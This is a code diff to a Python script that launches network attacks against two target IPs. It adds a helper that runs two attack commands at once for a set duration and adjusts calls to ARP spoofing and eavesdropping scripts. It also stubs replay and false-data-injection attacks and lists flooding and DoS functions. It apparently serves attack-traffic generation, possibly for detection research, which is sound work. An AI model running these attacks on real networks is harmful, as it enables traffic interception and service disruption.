@@ -52,6 +52,26 @@ def run_command(command):
     return
 
 
+def run_2_command(command1, command2):
+    try:
+        proc1 = subprocess.Popen(command1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc2 = subprocess.Popen(command2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        total_seconds = int(TIME_DURATION.total_seconds())
+        
+        for _ in tqdm(range(total_seconds), desc="Attack duration", unit="s"):
+            sleep(1)
+            
+        proc1.send_signal(signal.SIGINT)
+        proc2.send_signal(signal.SIGINT)
+        sleep(1)
+        
+    except Exception as e:
+        logger('error', f"Error running command: {e}")
+    
+    return
+
+
 ## FLOODING ATTACKS            
 def bruteforce_char(ip_addr):
     
@@ -81,7 +101,7 @@ def dos_tcp(ip_addr):
 ## IMPERSONATION ATTACKS
 def arp_spoof(ip_addr1, ip_addr2):
     
-    command = f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0'
+    command = f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
     
     run_command(command)
         
@@ -89,7 +109,7 @@ def arp_spoof(ip_addr1, ip_addr2):
 
 def arp_eveadropping(ip_addr1, ip_addr2):
         
-    command = f'sudo python3 arp_eavesdrop.py {ip_addr1} {ip_addr2} -r 5'
+    command = f'sudo python3 arp_eavesdrop.py {ip_addr1} {ip_addr2} -r 1'
     
     run_command(command)
         
@@ -112,10 +132,14 @@ def tcp_flag_injection(ip_addr):
     return
 
 def replay_attack(ip_addr1, ip_addr2):
+    ## Add recording
+    ## to do
     
     return
 
 def fdia_attack(ip_addr1, ip_addr2):
+    #make sine wave
+    #to-do
     
     return
             
@@ -126,10 +150,7 @@ if __name__ == "__main__":
     parser.add_argument('target2', help='IP of second target')
     
     TIME_DURATION = timedelta(minutes=1)
-    
-    #RUN
-    # sudo python3 main.py <target1> <target2>
-    
+      
     args = parser.parse_args()
     
     IP_ADDR_1= args.target1
